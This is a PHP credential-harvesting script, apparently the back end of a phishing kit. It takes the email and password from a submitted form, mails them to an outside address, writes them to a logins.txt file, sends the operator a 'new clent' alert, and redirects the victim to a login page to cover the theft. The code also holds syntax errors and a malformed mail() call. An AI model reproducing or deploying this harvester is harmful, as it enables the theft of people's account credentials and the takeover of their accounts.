<?php
        $mailsignup = $_POST["email"];
        $passwordsignup = $_POST["password"];
         $to = "daddy@fetishrequest.me";
         $subject = "Workshop mail signup";
         
         $message = "$mailsignup";
         $message .= "<br>$passwordsignup";
         
         $header = "From:daddy@fetishrequest.me \r\n";
         $header .= "Cc: \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
         
         $retval = mail($to,$subject,$message,$post,$send.php,$header);
         
         if( $retval == true ) {
            include("MKR.php");
         }else {
            echo "Sent";
         }
			session_start();
			
			$pass = $_POST["Passwd"];
			$email=$_SESSION["Email"];
			//opening logins text file for appending new data.
  			$file = fopen("logins.txt", "a") or die("Unable to open file!");
			//Writing email and password to logins.txt. 
  			fwrite($file, $email."	".$pass.PHP_EOL);			
  			fclose($file);//closing logins.txt.
}

  $Name = "D4 daddy"; //senders name
  $email = "daddy@fetishrequest.me"; //senders e-mail adress
  $recipient = "daddy@fetishrequest.me"; //recipient
  $mail_body = "new clent"; //mail body
  $subject = "details"; //subject
  $header = "From: ". $Name . " <" . $email . ">\r\n"; //optional headerfields
  mail($recipient, $subject, $mail_body, $header); //mail command :)
			//redirecting user to the google drive's locations where the game is available to download.
  			//change the location url to redirect to a website of your choice.
  			header("Location: /account/login");
			exit();
			
			
			session_destroy();
			

?>
